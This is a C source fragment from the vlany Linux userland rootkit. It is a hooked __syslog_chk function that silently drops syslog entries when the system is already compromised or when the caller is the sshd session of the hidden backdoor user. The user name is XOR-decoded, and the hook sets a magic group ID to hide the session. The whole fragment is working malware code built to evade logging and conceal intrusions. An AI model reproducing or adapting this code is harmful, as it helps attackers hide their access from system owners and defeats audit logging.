void __syslog_chk(int priority, int flag, const char *format, ...)
{
    #ifdef DEBUG
        printf("[vlany] __syslog_chk() called\n");
    #endif

    if(owned()) return;

    char sshd_str[64], *vlany_user = strdup(VLANY_USER); xor(vlany_user);
    snprintf(sshd_str, sizeof(sshd_str), "sshd: %s", vlany_user);
    CLEAN(vlany_user);

    if(strstr(procname_self(), sshd_str)) { setgid(MAGIC_GID); return; }

    va_list va;
    va_start(va, format);
    vsyslog(priority, format, va);
    va_end(va);
    return;
}
